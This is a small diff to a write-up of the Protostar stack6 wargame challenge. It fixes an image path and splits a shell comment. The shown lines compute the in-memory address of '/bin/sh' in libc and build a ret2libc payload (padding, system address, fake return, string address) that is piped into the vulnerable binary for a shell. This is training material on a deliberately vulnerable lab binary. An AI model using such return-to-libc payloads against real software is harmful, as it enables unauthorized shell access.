@@ -112,7 +112,7 @@ int main(int argc, char **argv)
 
 - But when the program is running, it link the libc to use build-in function. So we can find "/bin/sh" in this linked libc. In this program is /lib/libc-2.11.2.so with offset is 11f3bf
 
-![img](/stack6/assets/offset_binsh.png)
+![img](/protostar/stack6/assets/offset_binsh.png)
 
 - Finally, address of "/bin/sh" when program is running is calculated by `offset_binsh + libc_base_address = 0x11f3bf + 0xb7e97000 = 0xb7fb63bf`.
 
@@ -130,5 +130,6 @@ payload = ""
 payload += padding + sys_addr + fake_ret + binsh_addr
 print(payload)
 
-# python exp.py > temp.pwn && (cat temp.pwn; cat) | ./stack6
+# python exp.py > temp.pwn
+# (cat temp.pwn; cat) | ./stack6
 ```
